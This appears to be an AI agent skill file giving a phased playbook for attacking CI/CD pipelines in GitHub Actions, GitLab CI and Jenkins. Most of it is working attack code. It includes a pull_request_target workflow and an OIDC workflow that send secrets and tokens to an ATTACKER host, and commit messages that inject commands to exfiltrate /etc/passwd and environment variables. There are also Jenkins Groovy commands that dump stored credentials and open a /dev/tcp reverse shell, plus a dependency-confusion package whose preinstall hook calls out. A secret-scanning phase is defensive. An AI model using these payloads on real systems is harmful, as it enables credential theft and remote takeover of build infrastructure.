---
name: tech-cicd
description: "CI/CD pipeline security attacks. GitHub Actions pull_request_target exploitation, GitLab CI variable injection, Jenkins RCE via Groovy console, secret scanning, OIDC token hijacking, dependency confusion. Triggers: 'cicd', 'ci/cd', 'github actions', 'gitlab ci', 'pipeline poisoning', 'pull_request_target', 'oidc token', 'dependency confusion', 'jenkins rce', 'github secrets'."
---

# CI/CD Pipeline Security Attacks

GitHub Actions, GitLab CI, Jenkins — secret exfiltration, RCE, and dependency confusion attacks.

## Tools

```bash
pip install trufflehog --break-system-packages
brew install trufflehog    # macOS
go install github.com/zricethezav/gitleaks/v8@latest

pip install semgrep --break-system-packages

gh auth login
```

---

## Phase 1: Reconnaissance

```bash
TARGET="https://github.com/ORG/REPO"

gh api repos/ORG/REPO/contents/.github/workflows | jq '.[].name'

gh api repos/ORG/REPO/git/trees/HEAD?recursive=1 \
  | jq -r '.tree[] | select(.path | test(".github/workflows/.*\\.yml")) | .path' \
  | while read f; do
    echo "=== $f ==="; gh api repos/ORG/REPO/contents/$f | jq -r '.content' | base64 -d
done

gh api repos/ORG/REPO/actions/runners | jq '.runners'

nmap -sV -p 8080,8443,50000 TARGET_IP
curl -sk "http://TARGET_IP:8080/api/json" | jq .
```

---

## Phase 2: GitHub Actions — pull_request_target Exploitation

```bash
# + checkouts PR HEAD code → arbitrary code execution with secrets

cat workflow.yml | grep -A5 "pull_request_target"

# - uses: actions/checkout@v3

cat > .github/workflows/exploit.yml << 'EOF'
on:
  pull_request_target:
    types: [opened]
jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
    - name: Exfiltrate
      run: |
        curl -s "https://ATTACKER.com/exfil?secrets=${{ secrets.AWS_SECRET_KEY }}&token=${{ secrets.GITHUB_TOKEN }}"
EOF
```

---

## Phase 3: GitLab CI — Variable Injection

```bash

grep -r "CI_COMMIT_MESSAGE\|CI_MERGE_REQUEST_TITLE\|CI_COMMIT_BRANCH" .gitlab-ci.yml

#   - echo "Building $CI_COMMIT_MESSAGE"   ← injection via commit message!

git commit --allow-empty -m '$(curl http://ATTACKER/$(cat /etc/passwd | base64))'
git push

git commit --allow-empty -m $'x\ncurl https://ATTACKER/exfil?d=$(env | base64)'
```

---

## Phase 4: Jenkins — RCE via Groovy Console

```bash

curl -s "http://TARGET:8080/scriptText" \
  -u "admin:password" \
  --data-urlencode "script=def cmd = 'id'.execute(); println cmd.text"

curl -s "http://TARGET:8080/scriptText" \
  -u "admin:password" \
  --data-urlencode "script=println System.getenv()"

curl -s "http://TARGET:8080/scriptText" \
  -u "admin:password" \
  --data-urlencode "script=
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*
for (c in CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    Jenkins.instance, null, null)) {
  println(c.id + ': ' + (c.hasProperty('secret') ? c.secret : c.getPassword()))
}"

curl -s "http://TARGET:8080/scriptText" \
  -u "admin:password" \
  --data-urlencode 'script=def cmd = ["bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"].execute()'

curl -s "http://TARGET:8080/api/json?depth=1" -u "admin:password" \
  | jq '.jobs[].name'
```

---

## Phase 5: Secret Scanning

```bash
trufflehog git https://github.com/ORG/REPO
trufflehog git file://./   # local repo

gitleaks detect --source . --report-format json --report-path leaks.json
gitleaks detect --source . -v   # verbose

semgrep --config "p/github-actions" .github/
semgrep --config "p/gitlab" .gitlab-ci.yml

grep -rE "(secret|password|token|api_key|access_key)\s*[:=]\s*\S+" .github/workflows/
grep -rE "\$\{\{.*secrets\." .github/workflows/   # secrets references

gh api repos/ORG/REPO/actions/runs | jq '.workflow_runs[].id' \
  | head -5 | while read id; do
    gh api repos/ORG/REPO/actions/runs/$id/logs --output run_$id.zip
    unzip -p run_$id.zip | grep -i "secret\|password\|token\|api_key"
done
```

---

## Phase 6: OIDC Token Hijacking

```bash

cat > .github/workflows/oidc_steal.yml << 'EOF'
on: push
permissions:
  id-token: write
  contents: read
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
    - name: Get OIDC token
      run: |
        TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                     "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
        curl -X POST "https://ATTACKER/oidc" -d "token=$TOKEN"
EOF
```

---

## Phase 7: Dependency Confusion

```bash

cat package.json requirements.txt setup.py build.gradle | grep -v "^#"

npm view INTERNAL_PACKAGE 2>&1 | grep -i "not found"   # not found = vulnerable
pip index versions INTERNAL_PACKAGE 2>&1 | grep -i "not found"

mkdir exploit-pkg && cd exploit-pkg
cat > package.json << EOF
{
  "name": "INTERNAL_PACKAGE",
  "version": "9999.0.0",
  "description": "Dependency confusion test",
  "main": "index.js",
  "scripts": { "preinstall": "curl https://ATTACKER/callback?pkg=INTERNAL_PACKAGE&host=$(hostname)" }
}
EOF

npm publish   # requires npm account + clear authorization in scope

```

---

## Phase 8: GitHub Token Scope Abuse

```bash

curl -s -H "Authorization: token $TOKEN" https://api.github.com/repos/ORG/REPO | jq .permissions

# - Write to other repos (if default permissions are write)
# - Trigger other workflows
# - Read private repos in org

curl -s -H "Authorization: token $TOKEN" \
  "https://api.github.com/orgs/ORG/repos?type=private" | jq '.[].clone_url'
```

---

## Output

Save to `.omop/engagement/tech/cicd/`:
- `workflow-analysis.txt` — dangerous patterns found
- `secret-scan-results.json` — trufflehog/gitleaks output
- `jenkins-credentials.txt` — dumped credentials
- `oidc-tokens/` — captured tokens

## Next Phase

→ `cloud-recon` for cloud credential abuse (AWS/GCP/Azure)
→ `pentest-report` for final report
